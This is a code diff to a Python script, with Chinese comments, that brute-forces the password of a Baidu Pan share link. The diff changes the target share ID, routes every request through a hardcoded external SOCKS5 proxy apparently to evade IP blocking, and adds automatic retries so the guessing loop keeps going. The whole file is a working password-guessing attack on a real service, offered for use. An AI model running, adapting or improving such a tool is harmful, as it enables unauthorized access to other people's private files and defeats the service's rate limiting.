@@ -3,20 +3,27 @@
 import json
 import time
 import requests
+import sys
 
 # 变量
-urlid = "i56CzmH"
-pwd = "AAAA"
+urlid = "Zk0tgFzbaLVSTcjWkozqBw"
+pwd = "i100"
+
+# 代理
+proxies_dic = {
+#    'https': 'socks5://127.0.0.1:1080'
+   'https': 'socks5://107.181.174.63:4279'
+}
 
 
 # 提交密码返回结果
 def submit(pwd):
     datamod['pwd'] = pwd
-    res = s.post(url, params=urlmode, data=datamod)
+    res = s.post(url, params=urlmode, proxies=proxies_dic, data=datamod)
     res = res.json()['errno']
     print(f'{pwd}:{res}')
     if res == 0:
-        exit()
+        sys.exit()
 
 
 # 获取下一个密码
@@ -54,7 +61,8 @@ def formatPwd(pwd):
 # 清除 cookies 并重新获取
 def regetCookies():
     s.cookies.clear()
-    res = s.get(f"https://pan.baidu.com/share/init?surl={urlid}")
+    res = s.get(f"https://pan.baidu.com/share/init?surl={urlid}",
+                proxies=proxies_dic)
 
 
 # 新建会话
@@ -85,6 +93,7 @@ datamod = {
     "vcode_str": "",
 }
 
+s.proxies = proxies_dic
 pwd = formatPwd(pwd)
 # 如果密码不符合规则
 if pwd is None:
@@ -97,5 +106,9 @@ while pwd is not None:
         regetCookies()
         tmp = 0
     tmp += 1
-    submit(pwd)
-    pwd = getNextPwd(pwd)
+    try:
+        submit(pwd)
+        pwd = getNextPwd(pwd)
+    except Exception:
+        print('请求提交失败，10秒后重试……')
+        time.sleep(10)
